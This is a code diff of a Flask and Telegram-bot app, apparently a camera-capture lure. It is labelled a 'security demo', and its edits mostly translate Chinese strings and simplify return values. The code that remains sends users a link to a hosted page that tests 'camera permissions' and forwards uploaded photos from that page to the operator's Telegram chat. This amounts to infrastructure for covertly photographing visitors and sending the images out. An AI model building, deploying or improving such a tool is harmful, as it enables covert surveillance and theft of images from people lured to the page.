@@ -54,7 +54,7 @@ def upload():
         files = {'photo': ('photo.jpg', photo, 'image/jpeg')}
         data = {'chat_id': YOUR_CHAT_ID, 'caption': '📸 相机捕获 - 安全教育演示'}
         requests.post(f'https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto', data=data, files=files)
-        return 'OK', 200
+        return 'OK'
     return 'No photo', 400
 
 @app.route(f'/webhook/{BOT_TOKEN}', methods=['POST'])
@@ -65,21 +65,19 @@ def webhook():
         text = update['message'].get('text', '')
         if text == '/start':
             url = os.environ.get('RAILWAY_URL', 'https://hello-camera-production.up.railway.app')
-            send_message(chat_id, f"🔐 *安全教育演示*\n\n点击链接测试相机权限:\n{url}\n\n⚠️ 仅在您自己的设备上测试", parse_mode='Markdown')
+            send_message(chat_id, f"Security Demo\n\nTest camera:\n{url}\n\nTest on your own device only")
         else:
-            send_message(chat_id, "发送 /start 开始")
+            send_message(chat_id, "Send /start")
     return Response('OK', status=200)
 
-def send_message(chat_id, text, parse_mode=None):
+def send_message(chat_id, text):
     url = f'https://api.telegram.org/bot{BOT_TOKEN}/sendMessage'
     data = {'chat_id': chat_id, 'text': text}
-    if parse_mode:
-        data['parse_mode'] = parse_mode
     requests.post(url, data=data)
 
 @app.route('/health')
 def health():
-    return 'OK', 200
+    return 'OK'
 
 if __name__ == '__main__':
     app.run(host='0.0.0.0', port=5000)
